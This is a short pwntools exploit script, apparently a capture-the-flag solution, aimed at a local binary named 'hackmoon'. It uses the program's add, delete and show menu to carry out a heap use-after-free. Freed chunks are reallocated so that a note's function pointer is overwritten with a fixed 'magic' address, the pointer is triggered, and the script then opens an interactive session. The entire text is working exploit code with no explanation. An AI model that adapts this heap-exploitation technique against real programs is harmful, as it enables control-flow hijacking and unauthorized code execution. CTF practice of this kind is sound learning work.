from pwn import *
context.log_level = 'debug'
sh = process('./hackmoon')
elf = ELF('./hackmoon')

def add(size, content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('moon size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.send(content)


def delete(index, ):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(index))
    sh.recvuntil('Success\n')
    return


def show(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

magic= 0x8048986
add(0x8,'aaaaaaa')
add(0x8,'bbbbbbb')
delete(1)
delete(0)
add(0x20,'ccccccccc')
add(0x8,'deadbeef')
delete(3)
delete(2)
add(0x8,p32(magic)*2)
show(3)
#gdb.attach(sh)
sh.interactive()
